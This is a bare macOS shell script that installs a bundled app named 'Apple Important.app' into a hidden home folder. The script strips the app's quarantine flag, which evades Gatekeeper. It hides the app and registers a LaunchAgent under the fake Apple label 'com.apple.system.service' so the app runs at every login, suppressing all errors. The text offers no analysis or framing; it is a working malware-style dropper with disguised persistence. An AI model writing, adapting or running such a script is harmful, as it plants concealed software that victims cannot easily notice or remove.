


































APP_NAME="Apple Important.app"
LABEL="com.apple.system.service"

DIR="$( cd "$( dirname "${BASH_SOURCE}" )" && pwd )"
mkdir -p "$HOME/.apps"
TARGET_DIR="$HOME/.apps"
TARGET_APP="$TARGET_DIR/$APP_NAME"
PLIST="$HOME/Library/LaunchAgents/$LABEL.plist"



mkdir -p "$TARGET_DIR"

if [ -d "$TARGET_APP" ]; then
    rm -rf "$TARGET_APP"
fi

if [ -d "$DIR/$APP_NAME" ]; then
    cp -R "$DIR/$APP_NAME" "$TARGET_APP"
    
    xattr -rd com.apple.quarantine "$TARGET_APP" 2>/dev/null

    chflags hidden "$TARGET_APP"

    cat <<EOF > "$PLIST"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/open</string>
        <string>$TARGET_APP</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    launchctl unload "$PLIST" 2>/dev/null
    launchctl load "$PLIST" 2>/dev/null
fi

open "$TARGET_APP"

exit

